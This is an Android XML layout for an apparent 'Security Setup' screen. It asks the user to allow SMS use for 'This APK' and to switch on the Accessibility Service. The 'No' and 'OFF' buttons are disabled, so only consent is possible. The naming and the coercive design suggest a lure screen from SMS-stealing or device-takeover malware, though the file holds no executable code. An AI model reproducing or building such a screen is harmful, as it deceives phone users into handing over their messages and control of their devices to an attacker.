<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:padding="24dp"
    android:background="#FFFFFF">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Security Setup"
        android:textSize="22sp"
        android:textStyle="bold"
        android:textColor="#000000"
        android:layout_marginBottom="30dp" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Allow Use This APK"
        android:textSize="16sp"
        android:textStyle="bold"
        android:textColor="#333333"
        android:gravity="center"
        android:layout_marginBottom="10dp" />

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:layout_marginBottom="30dp">

        <Button
            android:id="@+id/btnYesSms"
            android:layout_width="120dp"
            android:layout_height="50dp"
            android:text="Yes"
            android:textColor="#FFFFFF"
            android:backgroundTint="#4CAF50"
            android:layout_marginRight="10dp" />

        <Button
            android:id="@+id/btnNoSms"
            android:layout_width="120dp"
            android:layout_height="50dp"
            android:text="No"
            android:textColor="#FFFFFF"
            android:backgroundTint="#F4433E"
            android:enabled="false"
            android:layout_marginLeft="10dp" />
    </LinearLayout>

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Need Accessibility Service On"
        android:textSize="16sp"
        android:textStyle="bold"
        android:textColor="#333333"
        android:gravity="center"
        android:layout_marginBottom="10dp" />

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="horizontal">

        <Button
            android:id="@+id/btnOnAccess"
            android:layout_width="120dp"
            android:layout_height="50dp"
            android:text="ON"
            android:textColor="#FFFFFF"
            android:backgroundTint="#4CAF50"
            android:layout_marginRight="10dp" />

        <Button
            android:id="@+id/btnOffAccess"
            android:layout_width="120dp"
            android:layout_height="50dp"
            android:text="OFF"
            android:textColor="#FFFFFF"
            android:backgroundTint="#F4433E"
            android:enabled="false"
            android:layout_marginLeft="10dp" />
    </LinearLayout>
</LinearLayout>